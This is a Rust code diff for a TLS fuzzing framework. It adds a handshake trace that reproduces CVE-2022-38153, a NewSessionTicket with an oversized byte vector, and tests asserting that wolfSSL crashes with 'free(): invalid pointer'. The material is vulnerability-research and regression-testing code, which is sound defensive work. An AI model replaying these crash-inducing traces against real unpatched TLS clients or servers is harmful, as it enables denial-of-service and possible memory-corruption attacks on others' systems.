@@ -591,6 +591,124 @@ pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TlsQueryMatcher> {
     trace
 }
 
+pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![
+            AgentDescriptor::new_client(client, TLSVersion::V1_2),
+            AgentDescriptor::new_server(server, TLSVersion::V1_2),
+        ],
+        steps: vec![
+            OutputAction::new_step(client),
+            // Client Hello, Client -> Server
+            InputAction::new_step(
+                server,
+                term! {
+                    fn_client_hello(
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0))
+                    )
+                },
+            ),
+            // Server Hello, Server -> Client
+            InputAction::new_step(
+                client,
+                term! {
+                        fn_server_hello(
+                            ((server, 0)),
+                            ((server, 0)),
+                            ((client, 0)),
+                            ((server, 0)),
+                            ((server, 0)),
+                            ((server, 0))
+                        )
+                },
+            ),
+            // Server Certificate, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_certificate(
+                            ((server, 0))
+                        )
+                    },
+                }),
+            },
+            // Server Key Exchange, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_server_key_exchange(
+                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
+                        )
+                    },
+                }),
+            },
+            // Server Hello Done, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_server_hello_done
+                    },
+                }),
+            },
+            // Client Key Exchange, Client -> Server
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_client_key_exchange(
+                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
+                        )
+                    },
+                }),
+            },
+            // Client Change Cipher Spec, Client -> Server
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_change_cipher_spec
+                    },
+                }),
+            },
+            // Client Handshake Finished, Client -> Server
+            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
+            // not know that the Handshake record message is encrypted. The parsed message from the
+            // could be a HelloRequest if the encrypted data starts with a 0.
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_opaque_message(
+                            ((client, 3)[None])
+                        )
+                    },
+                }),
+            },
+            // NewSessionTicket, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_new_session_ticket(
+                            ((server, 0)/u64),
+                            fn_large_bytes_vec
+                        )
+                    },
+                }),
+            },
+        ],
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use nix::{
@@ -603,10 +721,12 @@ pub mod tests {
         },
         unistd::{fork, ForkResult},
     };
+    use puffin::put::{PutDescriptor, PutOptions};
 
     use crate::{
-        put_registry::TLS_PUT_REGISTRY,
+        put_registry::{TLS_PUT_REGISTRY, WOLFSSL520_PUT},
         tls::{
+            seeds::{seed_session_resumption_dhe_full, seed_successful12_with_tickets},
             trace_helper::{TraceExecutor, TraceHelper},
             vulnerabilities::*,
         },
@@ -697,5 +817,89 @@ pub mod tests {
     fn test_seed_cve_2022_25638() {
         let ctx = seed_cve_2022_25638.execute_trace();
         assert!(ctx.agents_successful());
+    }
+
+    #[test]
+    #[cfg(feature = "tls12")]
+    #[ignore] // Disabled because requires: disable("postauth", None) in wolfSSL build.rs
+    /// Internal ID was "Finding 1"
+    fn test_seed_cve_2022_38152() {
+        let put = PutDescriptor {
+            name: WOLFSSL520_PUT,
+            options: PutOptions::new(vec![("clear", "true")]),
+        };
+
+        let trace = seed_session_resumption_dhe_full.build_trace();
+        let initial_server = trace.descriptors[0].name;
+        let server = trace.prior_traces[0].descriptors[0].name;
+
+        trace.execute_with_puts(
+            &TLS_PUT_REGISTRY,
+            &[(initial_server, put.clone()), (server, put)],
+        );
+        expect_crash(|| {});
+    }
+
+    #[test]
+    #[cfg(feature = "tls12")]
+    #[cfg(feature = "tls12-session-resumption")]
+    #[ignore] // Disabled because requires wolfSSL 5.3.0
+              // Internally known as "Finding 8"
+    fn test_seed_cve_2022_38153() {
+        for i in 0..50 {
+            seed_successful12_with_tickets.execute_trace();
+        }
+
+        expect_crash(|| {
+            seed_cve_2022_38153.execute_trace();
+        });
+    }
+
+    mod tcp {
+        use log::info;
+        use puffin::{
+            agent::{AgentName, TLSVersion},
+            put::PutDescriptor,
+        };
+
+        use crate::{
+            put_registry::{TCP_PUT, TLS_PUT_REGISTRY},
+            tls::{trace_helper::TraceHelper, vulnerabilities::seed_cve_2022_38153},
+        };
+
+        #[test]
+        #[ignore] // wolfssl example server and client are not available in CI
+                  // Internally known as "Finding 8"
+        fn test_wolfssl_openssl_test_seed_cve_2022_38153() {
+            let port = 44334;
+
+            let server_guard = openssl_server(port, TLSVersion::V1_2);
+            let server = PutDescriptor {
+                name: TCP_PUT,
+                options: server_guard.build_options(),
+            };
+
+            let port = 44335;
+
+            let client_guard = wolfssl_client(port, TLSVersion::V1_2, Some(50));
+            let client = PutDescriptor {
+                name: TCP_PUT,
+                options: client_guard.build_options(),
+            };
+
+            let trace = seed_cve_2022_38153.build_trace();
+            let descriptors = &trace.descriptors;
+            let client_name = descriptors[0].name;
+            let server_name = descriptors[1].name;
+            let mut context = trace.execute_with_puts(
+                &TLS_PUT_REGISTRY,
+                &[(client_name, client.clone()), (server_name, server.clone())],
+            );
+
+            let client = AgentName::first();
+            let shutdown = context.find_agent_mut(client).unwrap().put_mut().shutdown();
+            info!("{}", shutdown);
+            assert!(shutdown.contains("free(): invalid pointer"));
+        }
     }
 }
